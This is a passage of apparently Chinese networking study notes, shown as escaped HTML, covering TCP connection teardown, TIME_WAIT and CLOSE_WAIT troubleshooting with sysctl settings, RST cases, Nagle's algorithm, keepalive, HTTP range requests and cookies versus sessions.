&lt;p>半连接队列满后，不再插入后续的 &lt;code>SYN&lt;/code> 包，而在回应的 &lt;code>SYN + ACK&lt;/code> 包中夹带计算得到的 &lt;code>cookie&lt;/code>，后续若收到 &lt;code>ACK&lt;/code> 报文，则在检查合法性通过后将其直接加入 &lt;strong>全连接队列&lt;/strong>&lt;/p>
&lt;p>打开方法&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-conf" data-lang="conf">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">net.ipv4.tcp_syncookies&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>通过防火墙、路由器等过滤网关防护&lt;/li>
&lt;/ol>
&lt;h3 id="tcp-四次挥手">&lt;code>TCP&lt;/code> 四次挥手&lt;/h3>
&lt;h4 id="过程-1">过程&lt;/h4>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://resyon.netlify.app/img/10.jpg" >原图：小林coding&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>客户端将 &lt;code>FIN&lt;/code> 置为1，发送给服务器，用来关闭客户端到服务器的数据传送，客户端进入 &lt;code>FIN_WAIT_1&lt;/code> 状态。&lt;/li>
&lt;li>服务器收到 &lt;code>FIN&lt;/code> 之后，回复 &lt;code>ACK&lt;/code>，确认序号为收到序号+1，服务器进入 &lt;code>CLOSE_WAIT&lt;/code> 状态，此时 &lt;code>TCP&lt;/code> 连接处于&lt;strong>半关闭状态&lt;/strong>，即客户端没有要发送的数据了，但是仍然可以接受服务器端的数据。&lt;/li>
&lt;li>当服务器也没有要发送的数据时，向客户端发送一个 &lt;code>FIN&lt;/code>，用来关闭服务器到客户端的数据传送，服务器进入 &lt;code>LAST_ACK&lt;/code> 状态。&lt;/li>
&lt;li>客户端收到 &lt;code>FIN&lt;/code> 之后，进入 &lt;code>TIME_WAIT&lt;/code> 状态，回复 &lt;code>ACK&lt;/code>，确认序号为收到序号+1，服务器进入 &lt;code>CLOSED&lt;/code> 状态，完成四次挥手&lt;/li>
&lt;/ol>
&lt;h4 id="为什么-time_wait-要等-2msl">为什么 &lt;code>TIME_WAIT&lt;/code> 要等 2MSL&lt;/h4>
&lt;blockquote>
&lt;p>Linux 默认 MSL=30s
MSL：报文最大生存时间&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>确保 &lt;code>FIN&lt;/code> 发起方的最后一个 &lt;code>ACK&lt;/code> 被接收，否则接收方超时，重发 &lt;code>FIN&lt;/code>&lt;/li>
&lt;li>确保本次连接的报文段在网络中消失，以免干扰下一次连接. &lt;code>2MSL&lt;/code> 时间的 &lt;code>TIME_WAIT&lt;/code> 状态能够确保网络上两个传输方向上尚未被接收到的、迟到的 &lt;code>TCP&lt;/code> 报文段都已经消失（被中转路由丢弃）。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://resyon.netlify.app/img/11.jpg"
loading="lazy"
alt="旧的延迟的报文干扰"
>&lt;/p>
&lt;h3 id="tcp-发送-rst-的情形">&lt;code>TCP&lt;/code> 发送 &lt;code>RST&lt;/code> 的情形&lt;/h3>
&lt;blockquote>
&lt;p>&lt;code>RST&lt;/code> 表示复位，用来异常的关闭连接，在 &lt;code>TCP&lt;/code> 的设计中它是不可或缺的。发送 &lt;code>RST&lt;/code> 包关闭连接时，不必等缓冲区的包都发出去，&lt;strong>直接就丢弃&lt;/strong> 缓存区的包发送 &lt;code>RST&lt;/code>包。而接收端收到RST包后，也 &lt;strong>不必&lt;/strong> 发送 &lt;code>ACK&lt;/code> 包来确认。&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>在一个已关闭的socket上收到数据&lt;/li>
&lt;li>异常终止/异常关闭（如使用 &lt;code>SO_LINGER&lt;/code> 选项，故意在关闭时发 &lt;code>RST&lt;/code> 而非 &lt;code>FIN&lt;/code>，以跳过 &lt;code>TIME_WAIT&lt;/code>&lt;/li>
&lt;li>拒绝连接，如限定本地 IP 地址的服务端接收到非本地的 &lt;code>SYN&lt;/code> 时&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>一方已经关闭或异常终止而另一方仍未察觉的 &lt;code>TCP&lt;/code> 连接，称为 &lt;strong>半打开连接&lt;/strong>, 常见原因：主机异常；异常终止的一方重启后，若收到 &lt;code>TCP&lt;/code> 报文，将回复 &lt;code>RST&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;ol start="4">
&lt;li>检测，处理 &lt;strong>半打开连接&lt;/strong> ：A关闭了连接，B却没有收到结束报文（如网络故障），此时B还维持着原来的连接。A重启之后收到了B发送的报文，则回应RST复位报文。&lt;/li>
&lt;li>端口未打开：服务器程序端口未打开而客户端来连接。服务器程序 core dump 之后重启之前连续出现 &lt;code>RST&lt;/code> 的情况。&lt;/li>
&lt;li>端口不存在：若端口不存在，则直接返回 &lt;code>RST&lt;/code>，同时 &lt;code>RST&lt;/code> 报文接收通告窗口大小为0.&lt;/li>
&lt;li>请求超时：建立连接过程中，一端认为接收超时，即使受到了想要的数据，也会发送 &lt;code>RST&lt;/code> 拒绝进一步发送数据。&lt;/li>
&lt;/ol>
&lt;h3 id="tcp-连接同时打开关闭">&lt;code>TCP&lt;/code> 连接同时打开/关闭&lt;/h3>
&lt;h4 id="同时打开">同时打开&lt;/h4>
&lt;p>&lt;code>TCP&lt;/code> 设计上会通过4次握手 &lt;strong>成功&lt;/strong> 建立连接，但实现上不一定支持&lt;/p>
&lt;p>&lt;img src="https://resyon.netlify.app/img/0.png"
loading="lazy"
alt="状态转换"
>&lt;/p>
&lt;h4 id="同时关闭">同时关闭&lt;/h4>
&lt;p>4次挥手关闭，最后都进入 &lt;code>TIME_WAIT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://resyon.netlify.app/img/1.png"
loading="lazy"
alt="状态转换"
>&lt;/p>
&lt;h3 id="tcp-各阶段状态可能原因及解决">&lt;code>TCP&lt;/code> 各阶段状态可能原因及解决&lt;/h3>
&lt;h4 id="timewait">TIMEWAIT&lt;/h4>
&lt;blockquote>
&lt;p>大量连接处于 &lt;code>TIME_WAIT&lt;/code> 原因&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>TIME_WAIT&lt;/code> 状态说明是主动断开的连接，原因可能是应用所使用的反向代理服务器 (如 nginx) 未设置 &lt;code>connection: keep-alive&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>危害&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>内存占用&lt;/li>
&lt;li>端口占用，一个 &lt;code>TCP&lt;/code> 连接至少消耗 1 个本地端口，用尽则无法创建新连接&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>解决&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>调整 &lt;code>net.ipv4.ip_local_port_range&lt;/code> 增大可用的端口数量&lt;/li>
&lt;li>复用处于 &lt;code>TIME_WAIT&lt;/code> 的 &lt;code>socket&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-conf" data-lang="conf">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># turn on reuse
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_tw_reuse&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># make sure tcp timestamps on, default = 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 若客户端和服务端主机时间不同步时，客服端发送的消息会直接被拒绝
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_timestamps&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="3">
&lt;li>重置 &lt;code>TIME_WAIT&lt;/code> 连接&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-conf" data-lang="conf">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 默认为 18000，超过该值后，系统会重置所有的 TIME_WAIT
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_max_tw_buckets&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">18000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="4">
&lt;li>异常关闭连接，跳过 &lt;code>TIME_WAIT&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">linger&lt;/span> &lt;span class="n">so_linger&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">so_linger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">l_onoff&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">so_linger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">l_linger&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// SO_LINGER 使得关闭时发送 RST，而非 FIN
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nf">setsockopt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SOL_SOCKET&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SO_LINGER&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">so_linger&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">so_linger&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="close_wait">CLOSE_WAIT&lt;/h4>
&lt;blockquote>
&lt;p>原因&lt;/p>
&lt;/blockquote>
&lt;p>说明应用程序没有合适的关闭 &lt;code>socket&lt;/code>，既可能是程序写的有问题没有关闭，或者因为 IO，锁陷入睡眠状态，也可能是 CPU 过载，得不到调度&lt;/p>
&lt;p>通常来说，一个 &lt;code>CLOSE_WAIT&lt;/code> 会维持至少2个小时的时间（系统默认超时时间的是7200秒，也就是2小时）。如果服务端程序因某个原因导致系统造成一堆 &lt;code>CLOSE_WAIT&lt;/code> 消耗资源，那么通常是等不到释放那一刻，系统就已崩溃。&lt;/p>
&lt;blockquote>
&lt;p>解决&lt;/p>
&lt;/blockquote>
&lt;p>解决这个问题的方法还可以通过修改 &lt;code>TCP/IP&lt;/code> 的参数来缩短这个时间，于是修改tcp_keepalive_*系列参数。
给每一个 &lt;code>socket&lt;/code> 设置一个时间戳 &lt;code>last_update&lt;/code>，每接收或者是发送成功数据，就用当前时间更新这个时间戳。定期检查所有的时间戳，如果时间戳与当前时间差值超过一定的阈值，就关闭这个 &lt;code>socket&lt;/code>。&lt;/p>
&lt;h4 id="其他">其他&lt;/h4>
&lt;p>可以用 &lt;code>netstat -nat&lt;/code> 命令查看tcp各个状态的数量，哪个端口被占用、套接字的状态、接收缓冲区和发送缓冲区中的数据个数、IP、还有程序名字。&lt;/p>
&lt;p>NOTE：&lt;/p>
&lt;p>（1）主动端出现大量的 &lt;code>FIN_WAIT_1&lt;/code> 时需要注意网络是否畅通、出现大量的 &lt;code>FIN_WAIT_2&lt;/code> 需要仔细检查程序为何迟迟收不到对端的 &lt;code>FIN&lt;/code>（可能是主动方或者被动方的 bug ）、出现大量的 TIME_WAIT 需要注意系统的并发量/ socket 句柄资源/内存使用/端口号资源等。&lt;/p>
&lt;p>（2）被动端出现大量的 CLOSE_WAIT 需要仔细检查为何自己迟迟不愿调用 close 关闭连接（可能是bug，socket打开用完没有关闭）&lt;/p>
&lt;ol>
&lt;li>
&lt;p>LISTENING：侦听来自远方的 TCP 端口的连接请求. 首先服务端需要打开一个 socket 进行监听，状态为 &lt;code>LISTEN&lt;/code>。TCP 状态变化就是某个端口的状态变化，提供一个服务就打开一个端口。关闭不必要的端口是保证安全的一个非常重要的方面（ DDoS 攻击）。处于侦听 LISTENING 状态时，该端口是开放的，等待连接，但还没有被连接。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>SYN_SENT（客户端）：客户端通过应用程序 &lt;code>connect()&lt;/code> 连接时，客户端发送一个SYN以请求建立一个连接，之后状态置为SYN_SENT 。正常情况下 SYN_SENT 状态非常短暂。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>如果发现有很多 SYN_SENT 出现，那一般有这么几种情况：&lt;/p>
&lt;p>一是你要访问的网站不存在或线路不好，&lt;/p>
&lt;p>二是用扫描软件扫描一个网段的机器，也会出现很多 SYN_SENT，&lt;/p>
&lt;p>三是可能中了病毒了，例如中了&amp;quot;冲击波&amp;quot;，病毒发作时会扫描其它机器（扫描过程发出了同步请求），这样会有很多 SYN_SENT出现。&lt;/p>
&lt;p>3，SYN_RECEIVED（服务端）：当服务器收到客户端发送的同步信号时，将标志位 ACK 和 SYN 置 1 发送给客户端，此时服务器端处 SYN_RCVD 状态，如果连接成功了就变为 ESTABLISHED，正常情况下 SYN_RCVD 状态非常短暂。&lt;/p>
&lt;p>如果发现有很多 SYN_RCVD 状态，那你的机器有可能被 &lt;code>SYN Flood&lt;/code> 的 DoS (拒绝服务攻击)攻击了。这种情况下服务器端一般会重试（再次发送 SYN+ACK 给客户端）并等待一段时间后丢弃这个未完成的连接，这段时间的长度我们称为 SYN Timeout。&lt;/p>
&lt;ol start="4">
&lt;li>ESTABLISHED：代表一个打开的连接。&lt;/li>
&lt;/ol>
&lt;p>服务器出现很多 ESTABLISHED 状态：当客户端未主动 close 的时候就断开连接（没有正常进行四次挥手断开连接），若客户端断开的时候发送了 FIN 包，则服务端将会处于 CLOSE_WAIT 状态，若断开的时候未发送 FIN 包，则服务端处还是显示 ESTABLISHED 状态。当客户端重新连接服务器的时候，服务端肯定是 ESTABLISHED 状态，如果客户端重复上演这种情况，那么服务端将会出现大量的假的 ESTABLISHED 连接和 CLOSE_WAIT 连接。最终结果就是新的其他客户端无法连接上来，但是利用 netstat 还是能看到一条连接已经建立。&lt;/p>
&lt;ol start="5">
&lt;li>FIN-WAIT-1：主动关闭(active close)端应用程序调用close()，于是其 TCP 发出 FIN 请求主动关闭连接，之后进入 FIN_WAIT_1 状态。等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认。&lt;/li>
&lt;/ol>
&lt;p>如果服务器（作为主动关闭方？） 出现 shutdown 再重启，使用&lt;code>netstat -nat&lt;/code> 查看，就会看到很多 &lt;code>FIN-WAIT-1&lt;/code> 的状态。就是因为服务器当前有很多客户端连接，直接关闭服务器后，无法接收到客户端的 ACK。&lt;/p>
&lt;ol start="6">
&lt;li>CLOSE-WAIT：被动关闭 (passive close) 端 TCP 接到 FIN 后，就发出 ACK 以回应 FIN 请求(它的接收也作为文件结束符传递给上层应用程序),并进入 CLOSE_WAIT。&lt;/li>
&lt;/ol>
&lt;p>大量 closewait 的原因：代码层面上未对连接进行关闭，比如关闭代码未写在 finally 块关闭，如果程序中发生异常就会跳过关闭代码；程序响应过慢，比如双方进行通讯，当客户端请求服务端迟迟得不到响应，就断开连接，重新发起请求，导致服务端一直忙于业务处理，没空去关闭连接。这种情况也会导致这个问题；&lt;/p>
&lt;ol start="7">
&lt;li>
&lt;p>FIN-WAIT-2：主动关闭端接到 ACK 后，就进入了FIN-WAIT-2。这就是著名的 &lt;strong>半关闭状态&lt;/strong> 了，这是在关闭连接时，客户端和服务器两次握手之后的状态。在这个状态下，应用程序还有接受数据的能力，但是已经无法发送数据，但是也有一种可能是，客户端一直处于 FIN_WAIT_2 状态，而服务器则一直处于 CLOSE_WAIT 状态，而直到应用层来决定关闭这个状态。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LAST-ACK：被动关闭端一段时间后，接收到文件结束符的应用程序将调用 close() 关闭连接。这导致它的 TCP 也发送一个 FIN, 等待对方的 ACK. 就进入了 LAST-ACK。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>使用并发压力测试的时候，突然断开压力测试客户端，服务器会看到很多 LAST-ACK。&lt;/p>
&lt;p>9，TIME-WAIT：在主动关闭端接收到 FIN 后，TCP 就发送 ACK包，并进入 TIME-WAIT 状态。等待足够的时间以确保远程TCP接收到连接中断请求的确认。&lt;/p>
&lt;p>这个状态是防止最后一次握手的数据报没有传送到对方那里而准备的（注意这不是四次握手，这是第四次握手的保险状态）。这个状态在很大程度上保证了双方都可以正常结束，但是，问题也来了。&lt;/p>
&lt;p>由于插口的 2MSL 状态（插口是 IP 和端口对的意思，socket），使得应用程序在 2MSL 时间内是无法再次使用同一个插口的，对于客户程序还好一些，但是对于服务程序，例如 httpd，它总是要使用同一个端口来进行服务，而在 2MSL 时间内，启动 httpd 就会出现错误（插口被使用）。为了避免这个错误，服务器给出了一个平静时间的概念，这是说在2MSL时间内，虽然可以重新启动服务器，但是这个服务器还是要平静的等待2MSL时间的过去才能进行下一次连接。&lt;/p>
&lt;ol start="10">
&lt;li>
&lt;p>CLOSED：没有任何连接状态&lt;/p>
&lt;/li>
&lt;li>
&lt;p>CLOSING 状态：一般较少出现，这种是客户端和服务端同时发起了 FIN 主动关闭。如客户端发送 FIN 主动关闭，但是没有收到服务端发来的 ACK 确认，而是先收到了服务端发来的 FIN 关闭连接，所以必须是同时。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>在进入 CLOSING 状态后，只要收到了对方对自己发送的 FIN 的 ACK，收到 FIN 的 ACK 确认就进入 TIME_WAIT 状态，因此，如果 RTT(Round Trip Time TCP包的往返延时)处在一个可接受的范围内，发出的 FIN 会很快被 ACK 从而进入到 TIME_WAIT 状态，CLOSING 状态持续的时间就特别短，因此很难看到这种状态&lt;/p>
&lt;h3 id="nagle-算法">&lt;code>Nagle&lt;/code> 算法&lt;/h3>
&lt;p>该算法要求一个 &lt;code>TCP&lt;/code> 连接上最多只能有一个未被确认分未完成的小分组，在该分组的确认之前不能发送其他的小分组&lt;/p>
&lt;h4 id="作用-1">作用&lt;/h4>
&lt;p>避免小分组 (&lt;code>tinygram&lt;/code>) 在较慢的广域网上增加拥塞出现的可能，该算法的优越性在于自适应，通过确认的回复速率控制报文的传播速率&lt;/p>
&lt;h4 id="弊端">弊端&lt;/h4>
&lt;blockquote>
&lt;p>即便关闭 &lt;code>Nagle&lt;/code> 算法，&lt;code>ACK&lt;/code> 也会延迟发送（累积确认），默认为 200ms
更大延迟发送的 TCP 报文进一步影响实时性&lt;/p>
&lt;/blockquote>
&lt;h3 id="滑动窗口">滑动窗口&lt;/h3>
&lt;p>&lt;img src="https://resyon.netlify.app/img/2.png"
loading="lazy"
alt="滑动窗口"
>&lt;/p>
&lt;p>注意：窗口缩小时，右边沿并不（规定不能）向左移动&lt;/p>
&lt;h3 id="拥塞窗口">拥塞窗口&lt;/h3>
&lt;p>为支持 &lt;strong>慢启动&lt;/strong> 算法，发送方的 &lt;code>TCP&lt;/code> 增加了另一个窗口，即 &lt;strong>拥塞窗口&lt;/strong>&lt;/p>
&lt;h3 id="tcp-tahoe-tcp-reno">&lt;code>TCP Tahoe&lt;/code> &lt;code>TCP Reno&lt;/code>&lt;/h3>
&lt;p>&lt;strong>快速重传&lt;/strong> 算法最早出现的 &lt;code>4.3BSD Tahoe&lt;/code> 版本，&lt;code>3 Dup ACK&lt;/code> 后错误的使用慢启动；&lt;code>4.3BSD Reno&lt;/code> 出现了 &lt;strong>快速恢复&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>快速恢复
ssthresh = cwnd / 2
cwnd = ssthresh + 3 * MSS&lt;/p>
&lt;/blockquote>
&lt;h3 id="tcp-坚持定时器">&lt;code>TCP&lt;/code> 坚持定时器&lt;/h3>
&lt;p>窗口为 0 时，发送方受到抑制，若此时接收方的通告窗口不为 0 的 &lt;code>ACK&lt;/code> 恰好丢失，将发生死锁，发送方使用 &lt;strong>坚持定时器&lt;/strong> 来周期性地向接收方查询窗口是否增大，这种查询窗口的报文称为 &lt;strong>窗口探查&lt;/strong>&lt;/p>
&lt;h3 id="保活机制">保活机制&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-conf" data-lang="conf">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 7200s 无活动，保活机制启动
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_keepalive_time&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">7200&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 每次检测间隔 75s
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_keepalive_intvl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">75&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 9次无响应则视为死亡
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_keepalive_probes&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">9&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="http">HTTP&lt;/h2>
&lt;h3 id="范围请求">范围请求&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://juejin.cn/post/6844903642034765837" target="_blank" rel="noopener"
>ref&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>&lt;code>HTTP&lt;/code> 范围请求，需要 &lt;code>HTTP/1.1&lt;/code> 及之上支持，如果双端某一段低于此版本，则认为不支持。&lt;/li>
&lt;li>通过响应头中的 &lt;code>Accept-Ranges&lt;/code>（只有可选参数 &lt;code>bytes&lt;/code>）来确定是否支持范围请求。&lt;/li>
&lt;li>通过在请求头中添加 &lt;code>Range&lt;/code> 这个请求头，来指定请求的内容实体的字节范围。&lt;/li>
&lt;li>在响应头中，状态码为 &lt;code>206 Partial Content; 416 Range Not Satisfiable&lt;/code>, 通过 &lt;code>Content-Range&lt;/code> 来标识当前返回的内容实体范围，并使用 &lt;code>Content-Length&lt;/code> 来标识当前返回的内容实体范围长度。&lt;/li>
&lt;li>在请求过程中，可以通过 &lt;code>If-Range&lt;/code> 来区分资源文件是否变动，它的值来自 &lt;code>ETag&lt;/code> 或者 &lt;code>Last-Modifled&lt;/code>。如果资源文件有改动，会重新走下载流程。&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://resyon.netlify.app/img/13.awebp"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="cookie-session-的区别">&lt;code>cookie&lt;/code>, &lt;code>session&lt;/code> 的区别&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>cookie&lt;/code> 实际上是一小段的文本信息。浏览器发送请求到服务器，如果服务器需要记录该用户的状态（比如：用户访问网页的次数，登录状态等），就使用 &lt;code>response&lt;/code> 向客户端浏览器颁发一个 &lt;code>cookie&lt;/code>。客户端浏览器会把 &lt;code>cookie&lt;/code> 保存起来。当浏览器再次请求该网站时，浏览器就会把请求地址和 &lt;code>cookie&lt;/code> 一同给服务器。服务器检查该 &lt;code>cookie&lt;/code>，从而判断用户的状态。服务器还可以根据需要修改 &lt;code>cookie&lt;/code> 的内容。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session&lt;/code> 也是类似的记录用户状态的机制。不同的是&lt;/p>
&lt;ol>
&lt;li>&lt;code>cookie&lt;/code> 保存在 &lt;strong>客户端&lt;/strong> 浏览器中，而 &lt;code>session&lt;/code> 保存在 &lt;strong>服务器&lt;/strong> 上。&lt;/li>
&lt;li>&lt;code>session&lt;/code> 比 &lt;code>cookie&lt;/code> &lt;strong>安全&lt;/strong>，别人可以分析存放在本地的 &lt;code>cookie&lt;/code> 并进行 &lt;code>cookie&lt;/code> 欺骗。&lt;/li>
&lt;li>&lt;code>cookie&lt;/code> 能保存的 &lt;strong>数据量&lt;/strong> 比 &lt;code>session&lt;/code> 小，且 &lt;strong>只能保存字符串&lt;/strong>；&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h4 id="session-实现">session 实现&lt;/h4>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/hongweigg/article/details/38115675" target="_blank" rel="noopener"
>ref&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>session 是保存在服务端的会话信息，使用 &lt;code>SessionID&lt;/code> 标识&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>&lt;code>cookie&lt;/code> 可用，直接使用会话 &lt;code>cookie&lt;/code> 暂存 &lt;code>SessionID&lt;/code>&lt;/li>
&lt;li>&lt;code>cookie&lt;/code> 不可用，使用 &lt;code>url&lt;/code> 重写将 &lt;code>SessionID&lt;/code> 告知服务端&lt;/li>
&lt;/ol>
&lt;h2 id="ref">&lt;code>ref&lt;/code>&lt;/h2>
&lt;ul>
&lt;li>《 TCP/IP 详解（卷一）》&lt;/li>
&lt;li>&lt;a class="link" href="https://mp.weixin.qq.com/s/tH8RFmjrveOmgLvk9hmrkw" target="_blank" rel="noopener"
>https://mp.weixin.qq.com/s/tH8RFmjrveOmgLvk9hmrkw&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/cosen1024/Java-Interview/blob/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%8A.md" target="_blank" rel="noopener"
>https://github.com/cosen1024/Java-Interview/blob/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B8%8A.md&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://blog.csdn.net/ewq21qwe/article/details/106578463" target="_blank" rel="noopener"
>https://blog.csdn.net/ewq21qwe/article/details/106578463&lt;/a>&lt;/li>
